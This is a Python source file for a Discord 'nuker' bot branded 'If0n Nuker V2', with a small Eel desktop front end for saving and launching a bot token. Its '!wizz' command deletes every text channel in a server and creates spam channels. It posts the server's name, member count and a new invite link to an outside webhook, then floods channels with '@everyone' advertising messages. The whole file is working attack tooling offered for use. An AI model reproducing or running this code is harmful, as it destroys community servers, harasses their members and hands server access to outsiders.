import asyncio
import json
import random
import eel
import discord
from discord.ext import commands
import requests
import time
import threading
import concurrent.futures

eel.init('web')

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

config_path = 'config.json'
with open(config_path, 'r') as f:
        config = json.load(f)
webhook_url = config['webhook']

token = ""

@eel.expose
def save_token(token):
    global config
    if len(token) == 72:
        if config is None:
            config = {}
        config['token'] = token
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=4)
        return 'success'
    else:
        return 'failure'

@eel.expose
def launch():
    token = config.get('token', None)
    if token:
        bot.run(token)
        return 'success'
    else:
        return 'failure'


async def send_messages(channel):
    for _ in range(200):
        await channel.send("@everyone | GET NUKED BY IF0N NUKER V2 https://discord.gg/J4EtPnGw")

@bot.command()
async def wizz(ctx):
    server_name = ctx.guild.name
    members_count = ctx.guild.member_count

    channel_names = ['If0n-Nuker-Better', 'If0n-Nuker-v2', 'GET-NUKED']

    time.sleep(3)

    # Step 1 Deleting Every Channel
    print("Step 1")
    for channel in ctx.guild.text_channels:
        await channel.delete()

    # Step 2 Creating all the new channels to spam in
    print("Step 2")
    times = 0
    while times < 15:
        channel_name = channel_names[times % len(channel_names)]
        channel = await ctx.guild.create_text_channel(channel_name)
        times += 1

    # Step 3 Sending info about the server to the webhook and getting invite
    print("Step 3")
    text_channels = ctx.guild.text_channels
    random_channel = random.choice(text_channels)
    invite_link = await random_channel.create_invite()

    payload = {
        "username": "If0n Nuker",
        "embeds": [
            {
                "id": 568521340,
                "description": f"Server: {server_name}\n Num Of Members: {members_count}\n Invite: {invite_link}",
                "fields": [],
                "footer": {
                    "text": "Get Fucked!"
                },
                "color": 16711680
            }
        ]
    }

    response = requests.post(webhook_url, json=payload)
    print("Step 4")
    messages = 0
    max_messages = 400

    with concurrent.futures.ThreadPoolExecutor() as executor:
        while messages < max_messages:
            messages_to_send = min(max_messages - messages, len(text_channels))
            tasks = [send_messages(channel) for channel in text_channels[:messages_to_send]]

            await asyncio.gather(*tasks)

            messages += messages_to_send




if __name__ == "__main__":
    eel.start('index.html', size=(500, 550))